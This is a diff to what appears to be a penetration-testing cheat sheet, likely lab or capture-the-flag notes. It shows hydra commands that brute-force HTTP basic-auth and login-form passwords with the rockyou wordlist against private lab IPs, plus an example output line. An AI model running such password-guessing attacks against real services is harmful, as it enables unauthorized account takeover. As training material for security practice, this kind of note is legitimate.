@@ -12,4 +12,7 @@ hydra -l bob -P /path/to/wordlist.txt https-get://10.49.188.83/protected
 #### HTTP forms
 ```bash
 hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid"
+
+Ex output
+attacking http-post-form://10.49.135.232:80/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid
 ```
